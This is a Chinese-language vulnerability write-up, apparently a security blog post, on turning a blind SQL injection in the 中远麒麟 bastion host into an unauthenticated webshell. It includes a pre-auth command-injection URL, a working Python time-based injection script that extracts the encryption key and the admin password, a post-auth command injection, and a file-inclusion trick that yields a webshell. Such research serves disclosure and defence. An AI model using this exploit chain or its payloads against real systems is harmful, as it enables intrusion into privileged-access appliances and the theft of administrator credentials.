---
title: "中远麒麟堡垒机SQLi->webshell"
date: 2023-08-31T15:59:04+08:00
tags: ["sqli"]
---

早在之前v1.6时，有一个简单的pre-auth RCE

```
https://target/get_luser_by_sshport.php?clientip=1;command;&clientport=1
```

之后升级到了v1.7，也就是这次hvv爆出sqli的版本，其实在v1.6时就已经因为这个写法出了一堆sql注入，但不是很明白为什么没改，在hvv中爆出来的只有延时检测的poc，下面来看看怎么把这个没回显的注入转化到rce写入webshell

首先这个版本由于架构的调整，认证前可以访问的功能已经很少了，在 `admin.php` 193行开始，可以看到这次爆出来的注入

```php
else if($_GET['controller']=='admin_commonuser'){ 
	$username=$_POST['username']; 
	$password=$_POST['password']; 
	$minfo = $member->select_all("username='".$username."'");
```

username直接从post传入并且带入字符串，跟入 `select_all`，函数定义在 `model/base_set.class.php`

```php
public function select_all($where = '1=1', $orderby1 = '', $orderby2 = 'DESC') { 
	if($orderby1 == '') { 
		$orderby1 = $this->id_name; 
	} 
	return $result = $this->base_select("SELECT * FROM `$this->table_name` WHERE $where ORDER BY $orderby1 $orderby2"); 
}

function base_select($query) {
	$result = $this->query($query);
	if (!$result) {
		return NULL;
	}
	else if(mysql_num_rows($result) == 0) {
		return NULL;
	}
	else {
		while($row = mysql_fetch_assoc($result)) {
			$data[] = $row;
		}
		return $data;
	}
}

public function query($query) {
	global $_CONFIG;
	if($_CONFIG['DB_DEBUG']){
		echo $query . "<br>";
	}
	//echo $query;
	$result = mysql_query($query);
	if($result === false) {
		// echo "SQL:" . $query . "<br>";
		if($_CONFIG['DB_DEBUG']){
			echo "Error:" . mysql_error() . "<br>";
		}else{
			echo "Error: database error<br>";
		}
	}
	return $result;
}
```

可以看到直接带入了 mysql_query 造成注入，这里在 base_query 中加了一个打印错误信息的方便看到结果，实际操作该注入不回显

![](/img/tosec-audit-sqli-to-webshell/1.png)

在有注入之后，开始考虑怎么获取库里的数据，由于这个系统目前登录只是查了用户名然后再做密码比较，之后全用session，首先考虑的是怎么获取到管理员口令来完成用户登录，然而库里存的密码是不可见字符

![](/img/tosec-audit-sqli-to-webshell/2.png)

跟踪一下密码经过了什么处理

```php
public function udf_decrypt($password, $udf=0){//return $password;
    global $_CONFIG;
    $password=addcslashes($password,'\\\'');
    if(!$udf && $_CONFIG['PASSWORD_ENCRYPT_TYPE'])
        $p = $this->base_select("SELECT AES_DECRYPT('".($password)."','".$_CONFIG['PASSWORD_KEY']."') as pass");
    else
        $p = $this->base_select("SELECT udf_decrypt('".($password)."') as pass");
    return $p[0]['pass'];
}
```

这里的 `$_CONFIG['PASSWORD_ENCRYPT_TYPE']` 来源于库中的 `PASSWORD_ENCRYPT_TYPE`，默认开启

![](/img/tosec-audit-sqli-to-webshell/3.png)

那么需要找一下 `$_CONFIG['PASSWORD_KEY']` 是什么

```php
$PasswordKey = $settingobj->base_select("SELECT udf_decrypt(svalue) AS pass FROM setting WHERE  sname='PasswordKey'");
$_CONFIG['PASSWORD_KEY'] = $PasswordKey[0]['pass'];
```

那么就比较清晰了，使用延时先从表中取到 `PasswordKey`，再使用这个key通过延时去获取admin的明文密码

```python
payloads = '_-@.,' + string.digits + string.ascii_letters

def doSqli(subsql):    
    result = ''
    checkUrl = target + '/admin.php?controller=admin_index&action=chklogin&frommc=1&username=admin\' and if(ascii(substr((' + subsql + '),%d,1))=%d,sleep(5),1)%%23--'
    for i in range(30):
        for payload in payloads:
            try:
                req.get(checkUrl % (i+1, ord(payload)), timeout=3, verify=False)
            except requests.exceptions.ReadTimeout as ex:
                result += payload
            except Exception as e:
                pass
    return result

def doGetPass():
    subsql = "SELECT udf_decrypt(svalue) AS pass FROM setting WHERE  sname='PasswordKey'"
    print('[+] get passwordKey')
    PasswordKey = doSqli(subsql)
    print('[!] PasswordKey: ' + PasswordKey)
    subsql = "select aes_decrypt(password,'%s') from member where username='admin'" % PasswordKey
    print('[+] get admin pass')
    password = doSqli(subsql)
    print('[!] admin password: ' + password)
    return password
```

在获取到admin密码后，我们有了访问认证后功能的能力，那么找一下认证后的漏洞，其实这个就很简单了，随便找一下就有很多命令注入，比如 `c_admin_vpnlog.class.php` 中的 `cut` 函数

```php
function cut(){
    global $_CONFIG;
    $username= get_request('username', 0, 1);
    $cmd = $_CONFIG['CONFIGFILE']['VPNCUT']." ".$username;
    $a = exec($cmd, $o, $r);
    if($r==0){
        $this->member_set->query("UPDATE member set vpn=0 where username='".$username."'");
        alert_and_back('操作成功');
        return ;
    }
    alert_and_back('操作失败');
}
```

这里有个小问题，那就是 `get_request` 中其实做了一次传参的的转义，所以类似重定向之类的符号不能直接用，但这个很好绕过

```php
function daddslashes($string, $force = 0) {
    if(!MAGIC_QUOTES_GPC || $force) {
        if(is_array($string)) {
            foreach($string as $key => $val) {
                $string[$key] = daddslashes($val, $force);
            }
        } else {
            $string = htmlspecialchars(addslashes($string));
        }
    }
    return ($string);
}
```

到这里已经有一个命令执行了，但我希望实现webshell，这里的条件不是那么完美，因为当前的nginx配置为

```conf
 location ~ admin.php$ {
    root /opt/freesvr/web/htdocs/freesvr/audit/public/;
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_index admin.php;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
    fastcgi_param  VERIFIED $ssl_client_verify;
    fastcgi_param  DN $ssl_client_s_dn;
    fastcgi_connect_timeout 300;
    fastcgi_read_timeout 600;
    fastcgi_send_timeout 600;
}
```

这也导致不管怎么写文件其实都是没办法访问的，因为除了 `admin.php` 之外其实都不给解析到php，随后在继续阅读 `admin.php` 代码时发现

```php
if(isset($_GET['controller'])) {
	$controller = 'c_' . $_GET['controller'];
}
else {
	$controller = 'c_admin_index';
}

if(!empty($_GET['action'])) {
	$action = $_GET['action'];
}
else {
	$action = 'index';
}
$language = array('en','cn');
// ...
require_once(ROOT . './include/language_cn.php');
if(in_array(LANGUAGE,$language)){
	require_once(ROOT . './include/language_'.LANGUAGE.'.php');
}
if($_SESSION['ADMIN_UID']){ /* ... */ }
if(file_exists(ROOT ."./controller/$controller.class.php")) {
	require_once(ROOT ."./controller/$controller.class.php");	
    if((!isset($_SESSION["ADMIN_LOGINED"]) || $_SESSION["ADMIN_LOGINED"] == false) && ($action != 'login_user_field' && $action != 'login' && $action !='chklogin' && $action != 'getpwd'&& $action != 'docronreports'&& $action != 'synchronization_ad_users'&& $action != 'synchronization_ldap_users'&&$action!='get_user_login_fristauth'&& $action != 'get_sms'&& $action != 'get_email'&&$action!='get_weixin'&&$action!='qrcodeimage'&&$action!='watertext')) { 
        /* 跳回登录 */
    }
    else {
        /* 权限控制 */
    }
```

在对是否登录的检查(这里并不会跳回登录页)之后，就开始取 `controller` 与 `action`，将对应的controller文件包含进来后再开始判断是否需要跳回登录与权限校验，那么如果写入一个 `./controller/c_shell.class.php`，再走 `admin.php` 来包含不就可以完成webshell吗，并且还可以无需认证即可访问

到此，就可以实现从未授权sqli->webshell

![](/img/tosec-audit-sqli-to-webshell/4.png)